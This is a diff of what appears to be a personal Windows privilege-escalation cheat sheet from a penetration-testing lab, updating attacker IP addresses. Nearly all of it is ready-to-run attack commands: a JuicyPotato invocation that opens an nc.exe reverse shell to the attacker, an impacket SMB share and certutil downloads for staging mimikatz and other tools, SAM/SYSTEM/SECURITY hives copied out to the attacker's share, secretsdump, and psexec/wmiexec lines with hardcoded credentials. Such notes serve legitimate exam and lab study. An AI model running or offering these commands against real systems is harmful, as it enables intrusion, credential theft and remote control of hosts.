@@ -2,9 +2,10 @@
 whoami
 whoami /priv
 
+Impersonate
 SeRestorePrivilege = Enable-System32-Utilman-RDP
 SeImpersonatePrivilege = juicypotato/printspoof
-# \\192.168.119.155\share\juicy.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c  \\192.168.119.155\share\nc.exe -e cmd.exe 192.168.119.155 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} 
+# \\192.168.162.46\share\juicy.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c  \\192.168.162.46\share\nc.exe -e cmd.exe 192.168.162.46 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} 
 
 ================================== 
 hostname                    
@@ -364,17 +365,17 @@ TOOLS
  
 cd ~\tools\privesc_windows
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
-net use \\192.168.49.124\share /USER:mike helps  
+net use \\192.168.162.46\share /USER:mike helps  
 mkdir C:\temp
 cd C:\temp\
 cd C:\Users\Bob\Downloads\ 
-copy winPEASx64.exe \\192.168.49.124\share\
-copy chisel.exe \\192.168.49.124\share\
-copy mimikatz_64.exe \\192.168.49.124\share\
-copy PowerUp.ps1 \\192.168.49.124\share\
-copy SharpHound.exe \\192.168.49.124\share\
-copy nc.exe \\192.168.49.124\share\ 
-copy Invoke-Kerberoast.ps1 \\192.168.49.124\share\  
+copy winPEASx64.exe \\192.168.162.46\share\
+copy chisel.exe \\192.168.162.46\share\
+copy mimikatz_64.exe \\192.168.162.46\share\
+copy PowerUp.ps1 \\192.168.162.46\share\
+copy SharpHound.exe \\192.168.162.46\share\
+copy nc.exe \\192.168.162.46\share\ 
+copy Invoke-Kerberoast.ps1 \\192.168.162.46\share\  
 
 python3 -m http.server 80
 certutil -urlcache -split -f http://192.168.162.46:80/winPEASx64.exe 
@@ -460,12 +461,12 @@ SAM
 
 mkdir c:\temp
 cd c:\temp\  
-copy samx \\192.168.119.154\share\  
-copy systemx \\192.168.119.154\share\  
-copy securityx \\192.168.119.154\share\  
+copy samx \\192.168.162.46\share\  
+copy systemx \\192.168.162.46\share\  
+copy securityx \\192.168.162.46\share\  
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
-net use \\192.168.49.124\share /USER:mike helps
-copy *x \\192.168.49.124\share\  
+net use \\192.168.162.46\share /USER:mike helps
+copy *x \\192.168.162.46\share\  
 secretsdump -sam samx -system systemx LOCAL  
  
  
@@ -568,14 +569,11 @@ wmiexec.py mydom/administrator:"password!"@192.168.200.5
 atexec.py mydom/administrator:"password!"@192.168.200.5 "whoami" 
 
 ================================== 
-Pivot and Pwn
+Track, Attack and Pwn
 
-psexec mike.com/sqlserver:sqlpax@10.11.1.123
-psexec mike.com/sqlserver:sqlpax@10.11.1.122
-psexec mike.com/sqlserver:sqlpax@10.11.1.121
-psexec mike.com/sqlserver:sqlpax@10.11.1.120
-psexec mike.com/david:paxx@10.11.1.120 
-secretsdump mike.com/david:paxx@10.11.1.120 
+psexec mike.com/sqlserver:sqlpax@192.168.200.5
+psexec mike.com/david:paxx@192.168.200.5
+secretsdump mike.com/david:paxx@192.168.200.5
 
 ================================== 
 Proof 
